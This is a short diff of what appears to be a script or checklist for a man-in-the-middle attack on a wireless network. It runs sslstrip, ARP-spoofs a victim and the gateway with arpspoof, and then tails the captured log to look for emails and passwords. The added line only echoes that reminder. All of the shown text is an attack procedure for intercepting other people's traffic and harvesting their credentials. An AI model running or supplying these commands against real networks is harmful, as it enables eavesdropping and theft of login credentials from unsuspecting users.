@@ -17,5 +17,6 @@ sslstrip -l 8080
 arpspoof -i wlan0 -t victim -r gateway
 
 #4.
+echo look for email / password / pass / passwd
 tail -f sslstrip.log 
 #look for email / password / pass / passwd
